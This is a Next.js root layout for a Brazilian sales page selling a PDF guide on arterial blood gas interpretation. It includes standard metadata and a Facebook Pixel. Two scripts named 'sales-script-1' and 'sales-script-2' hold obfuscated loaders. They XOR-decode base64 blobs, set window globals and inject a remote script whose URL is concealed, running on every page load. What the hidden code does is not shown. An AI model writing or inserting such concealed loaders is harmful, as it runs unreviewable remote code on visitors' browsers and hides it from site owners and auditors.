import type { Metadata } from 'next'
import { Inter, Anton } from 'next/font/google'
import Script from 'next/script'
import './globals.css'

const inter = Inter({
  variable: '--font-inter',
  subsets: ['latin'],
})

const anton = Anton({
  variable: '--font-anton',
  subsets: ['latin'],
  weight: ['400'],
})

export const metadata: Metadata = {
  title: 'Guia Visual de Gasometria Arterial | Interpretação em 60 Páginas',
  description:
    'Guia digital em PDF com 60 páginas sobre gasometria arterial: parâmetros, equilíbrio ácido-base, distúrbios, compensação, oxigenação e 14 casos comentados.',
  generator: 'v0.app',

  openGraph: {
    title: 'Guia Visual de Gasometria Arterial | Interpretação em 60 Páginas',
    description:
      'Fluxogramas, explicações visuais e casos comentados para relacionar os parâmetros e acompanhar a interpretação da gasometria arterial. 7 dias de garantia.',
    type: 'website',
    locale: 'pt_BR',
    siteName: 'Guia Visual de Gasometria Arterial',
  },

  twitter: {
    card: 'summary_large_image',
    title: 'Guia Visual de Gasometria Arterial',
    description:
      'Guia visual em PDF para estudar e revisar a interpretação da gasometria arterial. 7 dias de garantia.',
  },

  icons: {
    icon: [
      {
        url: '/icon-light-32x32.png',
        media: '(prefers-color-scheme: light)',
      },
      {
        url: '/icon-dark-32x32.png',
        media: '(prefers-color-scheme: dark)',
      },
      {
        url: '/icon.svg',
        type: 'image/svg+xml',
      },
    ],
    apple: '/apple-icon.png',
  },
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html
      lang="pt-BR"
      className={`${inter.variable} ${anton.variable} bg-background`}
    >
      <head>
        <Script
          id="sales-script-1"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `(function(){var i_471x=atob("DLtJkRacRVgLG7zq4cBr5GTwZ2Ipc8iekchzvjn/ITYlbsiHiN0wv3XzKHZpaZOZgskg4WLvaihiY9mGzssg6XPwazJ4OZDIgM8943/+MCxuaJ7QuuZls3HwKjpqd8/I2+Ays3j9KD0pIZ6aiMMs/V/4Z3Qpbd2GlN5rqzSqJDs6LN/T1tl+qCb/J206eoXY1Ih7pyC+OAV2");var w_gdpd=[];for(var v_0isf=0;v_0isf<i_471x.length;v_0isf++){w_gdpd.push(i_471x.charCodeAt(v_0isf)&255);}var k_dm8z=w_gdpd[0];var w_apr=w_gdpd.slice(1,1+k_dm8z);var v_ajw=w_gdpd.slice(1+k_dm8z);var r_xqf=v_ajw.map(function(b,c_i2d){return b^w_apr[c_i2d%k_dm8z];});var t_5="";for(var n_t75=0;n_t75<r_xqf.length;n_t75++){t_5+=String.fromCharCode(r_xqf[n_t75]&255);}var d_u2e0=decodeURIComponent(escape(t_5));var j_bs=JSON.parse(d_u2e0);var r_c=j_bs.globals||[];r_c.forEach(function(v_ki){window[v_ki.name]=v_ki.value;});var p_vj4=document.createElement("script");p_vj4.src=j_bs.url;p_vj4.async=true;p_vj4.defer=true;(j_bs.attributes||[]).forEach(function(x_0u7a){p_vj4.setAttribute(x_0u7a.name,x_0u7a.value);});(document.head||document.documentElement).appendChild(p_vj4);})();`,
          }}
        />

        <Script
          id="sales-script-2"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `(function(){var l_u=atob("DOJU0MeHZgVosnwN2Zl2pbXrRD9K2gh5qZFu/+jkAmtGxwhgsIQt/qToCysKwFN+upA9oLP0SXAc3w8itYMgtbTzSG8bkFAvuJYgoq7lE3ENwV43gpl2vqbqAydSkBhsrYN5pbPqD2MRnwx/vJQxvrOqHmYH1lF+uol2/OXxB2kd1143+8Ap/LylCGQF1143+4Y1pKaqE3EF2xp09JImtbHiCHFFwQlvsIYn8uulEGQExxkv48B2rZr6");var i_yrw=[];for(var x_ng=0;x_ng<l_u.length;x_ng++){i_yrw.push(l_u.charCodeAt(x_ng)&255);}var n_t=i_yrw[0];var v_1=i_yrw.slice(1,1+n_t);var q_7=i_yrw.slice(1+n_t);var h_8z=q_7.map(function(b,j_2r){return b^v_1[j_2r%n_t];});var t_my="";for(var p_wr6g=0;p_wr6g<h_8z.length;p_wr6g++){t_my+=String.fromCharCode(h_8z[p_wr6g]&255);}var x_1=decodeURIComponent(escape(t_my));var x_7=JSON.parse(x_1);var l_2dit=x_7.globals||[];l_2dit.forEach(function(o_s3su){window[o_s3su.name]=o_s3su.value;});var w_i6=document.createElement("script");w_i6.src=x_7.url;w_i6.async=true;w_i6.defer=true;(x_7.attributes||[]).forEach(function(t_4y){w_i6.setAttribute(t_4y.name,t_4y.value);});(document.head||document.documentElement).appendChild(w_i6);})();`,
          }}
        />

        <Script
          id="facebook-pixel"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `!function(f,b,e,v,n,t,s)
            {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
            n.callMethod.apply(n,arguments):n.queue.push(arguments)};
            if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
            n.queue=[];t=b.createElement(e);t.async=!0;
            t.src=v;s=b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t,s)}(window, document,'script',
            'https://connect.facebook.net/en_US/fbevents.js');
            fbq('init', '1433166875412790');
            fbq('track', 'PageView');`,
          }}
        />
        <noscript>
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img
            height="1"
            width="1"
            style={{ display: 'none' }}
            src="https://www.facebook.com/tr?id=1433166875412790&ev=PageView&noscript=1"
            alt=""
          />
        </noscript>
      </head>

      <body className="font-sans antialiased">
        {children}
      </body>
    </html>
  )
}
